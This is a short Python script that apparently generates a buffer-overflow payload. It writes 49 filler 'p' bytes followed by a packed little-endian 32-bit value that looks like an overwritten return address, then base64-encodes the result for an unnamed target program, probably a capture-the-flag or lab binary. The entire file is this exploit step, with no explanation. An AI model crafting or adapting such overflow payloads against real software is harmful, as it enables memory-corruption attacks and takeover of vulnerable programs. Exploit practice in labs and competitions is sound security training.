
import sys
import struct
import base64

buf = b'ppppppppppppppppppppppppppppppppppppppppppppppppp'
buf += struct.pack('<I', 1343242386)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
